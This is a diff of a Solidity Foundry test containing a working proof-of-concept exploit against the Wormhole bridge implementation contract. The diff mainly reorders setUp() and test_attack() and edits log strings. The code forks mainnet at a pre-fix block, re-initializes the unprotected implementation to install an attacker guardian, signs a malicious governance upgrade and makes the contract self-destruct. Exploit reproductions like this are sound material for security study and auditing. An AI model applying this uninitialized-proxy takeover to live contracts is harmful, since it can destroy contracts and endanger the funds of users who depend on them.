@@ -55,7 +55,7 @@ contract EvilWormhole {
 contract Destructor {
 
   function destruct() external {
-    console.log("\n[3] Self-destructing...");
+    console.log("[3] Self-destructing...");
     selfdestruct(payable(address(this)));
   }
 }
@@ -69,6 +69,55 @@ contract ExploitWormhole is TestHarness {
     address[] attackerAddresses = [attacker];
     EvilWormhole evilWormhole;
 
+    function setUp() external {
+        Structs.VM memory vm;
+        bytes memory _vm;
+        bytes32 HASH_ZERO = 0x0000000000000000000000000000000000000000000000000000000000000000;
+        uint size;
+
+        // Wormhome last upgraded their implementation contract submitContractUpgrade() at tx hash: https://etherscan.io/tx/0xd45111d7c22a4ba4a1cd110c8224859000fcb0cd5cefd02bd40434ac42a07be6
+        // at blockNumber: 13818843
+        // Wormhole initialized the implementation initialize(), fixing the issue, at tx hash: https://etherscan.io/tx/0x9acb2b580aba4f5be75366255800df5f62ede576619cb5ce638cedc61273a50f
+        // at blockNumber: 14269474
+        cheat.createSelectFork("mainnet", 13818843);
+
+        evilWormhole = new EvilWormhole();
+        console.log("Evil contract @", address(evilWormhole));
+        size = codeSize(address(wormholeImpl));
+        dumpCode(address(wormholeImpl), size);
+
+        console.log("[1] Re-initializing bridge to set attacker guardian...");
+        wormholeImpl.initialize(attackerAddresses, 0, 0, HASH_ZERO);
+
+        bytes memory payload = buildPayload(address(evilWormhole));
+        _vm = signAndEncodeVM(
+                0,
+                0,
+                wormholeImpl.governanceChainId(),
+                wormholeImpl.governanceContract(),
+                0,
+                payload,
+                attackerKeys,
+                wormholeImpl.getCurrentGuardianSetIndex(),
+                2
+        );
+        vm = parseVM(_vm);
+
+        console.log("[2] Submitting malicious VM to upgrade the contract...");
+        console.logBytes(vm.payload);
+        wormholeImpl.submitContractUpgrade(_vm);
+    }
+
+    function test_attack() external {
+
+        address addr = address(wormholeImpl);
+        uint size = codeSize(addr);
+
+        dumpCode(addr, size);
+        assertEq(size, 0);
+    }
+
+    // Helper functions
     function signAndEncodeVM(
         int32 timestamp, 
         uint32 nonce,
@@ -199,53 +248,5 @@ contract ExploitWormhole is TestHarness {
         bytes memory payload = BytesLib.concat(STUB, addressEncoded);
 
         return payload;
-    }
-
-    function setUp() external {
-        Structs.VM memory vm;
-        bytes memory _vm;
-        bytes32 HASH_ZERO = 0x0000000000000000000000000000000000000000000000000000000000000000;
-        uint size;
-
-        // Wormhome last upgraded their implementation contract submitContractUpgrade() at tx hash: https://etherscan.io/tx/0xd45111d7c22a4ba4a1cd110c8224859000fcb0cd5cefd02bd40434ac42a07be6
-        // at blockNumber: 13818843
-        // Wormhole initialized the implementation initialize(), fixing the issue, at tx hash: https://etherscan.io/tx/0x9acb2b580aba4f5be75366255800df5f62ede576619cb5ce638cedc61273a50f
-        // at blockNumber: 14269474
-        cheat.createSelectFork("mainnet", 13818843);
-
-        evilWormhole = new EvilWormhole();
-        console.log("Evil contract @", address(evilWormhole));
-        size = codeSize(address(wormholeImpl));
-        dumpCode(address(wormholeImpl), size);
-
-        console.log("\n[1] Re-initializing bridge to set attacker guardian...");
-        wormholeImpl.initialize(attackerAddresses, 0, 0, HASH_ZERO);
-
-        bytes memory payload = buildPayload(address(evilWormhole));
-        _vm = signAndEncodeVM(
-                0,
-                0,
-                wormholeImpl.governanceChainId(),
-                wormholeImpl.governanceContract(),
-                0,
-                payload,
-                attackerKeys,
-                wormholeImpl.getCurrentGuardianSetIndex(),
-                2
-        );
-        vm = parseVM(_vm);
-
-        console.log("\n[2] Submitting malicious VM to upgrade the contract...");
-        emit log_named_bytes("Payload", vm.payload);
-        wormholeImpl.submitContractUpgrade(_vm);
-    }
-
-    function test_attack() external {
-
-        address addr = address(wormholeImpl);
-        uint size = codeSize(addr);
-
-        dumpCode(addr, size);
-        assertEq(size, 0);
     }
 }
